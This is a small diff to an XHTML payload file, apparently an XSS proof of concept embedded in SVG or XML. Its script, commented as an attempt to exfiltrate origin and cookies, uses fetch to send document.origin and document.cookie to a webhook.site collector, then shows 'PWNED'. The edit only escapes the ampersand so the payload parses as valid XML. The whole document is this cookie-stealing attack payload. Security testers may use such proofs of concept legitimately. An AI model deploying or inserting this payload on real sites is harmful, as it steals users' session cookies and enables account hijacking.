@@ -3,7 +3,7 @@
     <body xmlns="http://www.w3.org/1999/xhtml">
       <script>
         // Attempt to exfiltrate origin and cookies
-        fetch('https://webhook.site/7ad9857d-947a-4e25-8fb7-14f6921c32c8?origin=' + document.origin + '&cookie=' + document.cookie)
+        fetch('https://webhook.site/7ad9857d-947a-4e25-8fb7-14f6921c32c8?origin=' + document.origin + '&amp;cookie=' + document.cookie)
       </script>
       <p style="color:red; font-size:24px;">PWNED</p>
     </body>
